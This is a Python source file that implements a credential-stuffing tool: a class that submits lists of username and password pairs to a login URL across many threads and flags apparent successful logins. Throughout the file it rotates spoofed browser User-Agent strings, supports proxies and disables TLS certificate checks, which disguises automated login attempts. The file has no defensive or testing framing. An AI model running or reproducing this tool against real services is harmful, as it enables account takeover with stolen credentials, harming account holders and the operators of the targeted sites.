import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional
from config import config


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.50",
]


class CredentialStuffer:
    def __init__(self, threads: int = None, timeout: int = None, proxy: str = None, rate_limit: int = None):
        self.threads = threads or config.MAX_THREADS
        self.timeout = timeout or config.TIMEOUT
        self.proxy = proxy or config.PROXY_URL
        self.rate_limit = rate_limit or config.RATE_LIMIT
        self.results = []
        self._request_times = []
        self._lock = __import__("threading").Lock()
        self._ua_index = 0

    def credential_stuff_login(self, url: str, credentials: List[Dict]) -> Dict:
        self.results = []
        total = len(credentials)
        completed = 0
        successful = 0

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for cred in credentials:
                username = cred.get("username", "")
                password = cred.get("password", "")
                future = executor.submit(self._test_credential, url, username, password)
                futures[future] = (username, password)

            for future in as_completed(futures):
                completed += 1
                try:
                    result = future.result()
                    if result and result.get("success"):
                        successful += 1
                        self.results.append(result)
                except Exception:
                    continue

        return {
            "scan_type": "credential_stuffing",
            "target": url,
            "total_tested": total,
            "successful": successful,
            "results": self.results,
        }

    def _test_credential(self, url: str, username: str, password: str) -> Dict:
        self._rate_limit_wait()
        session = requests.Session()
        ua = USER_AGENTS[self._ua_index % len(USER_AGENTS)]
        self._ua_index += 1
        session.headers.update({"User-Agent": ua})

        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        try:
            login_data = {
                "username": username,
                "password": password,
                "user": username,
                "pass": password,
                "email": username,
            }

            response = session.post(
                url,
                data=login_data,
                timeout=self.timeout,
                proxies=proxies,
                allow_redirects=False,
                verify=False,
            )

            is_success = (
                response.status_code in (200, 302)
                and "invalid" not in response.text.lower()
                and "error" not in response.text.lower()
                and "failed" not in response.text.lower()
                and "incorrect" not in response.text.lower()
            )

            if is_success and response.status_code == 200:
                lower_text = response.text.lower()
                if "login" in response.url.lower() or "signin" in response.url.lower():
                    is_success = False
                if "wrong password" in lower_text or "invalid credentials" in lower_text:
                    is_success = False

            return {
                "type": "credential_test",
                "url": url,
                "username": username,
                "password": password,
                "success": is_success,
                "status_code": response.status_code,
                "response_size": len(response.text),
                "user_agent": ua,
            }

        except requests.RequestException as e:
            return {
                "type": "credential_test",
                "url": url,
                "username": username,
                "password": password,
                "success": False,
                "error": str(e),
                "user_agent": ua,
            }

    def _rate_limit_wait(self):
        with self._lock:
            now = time.time()
            self._request_times = [t for t in self._request_times if now - t < 1.0]
            if len(self._request_times) >= self.rate_limit:
                sleep_time = 1.0 - (now - self._request_times[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self._request_times.append(time.time())
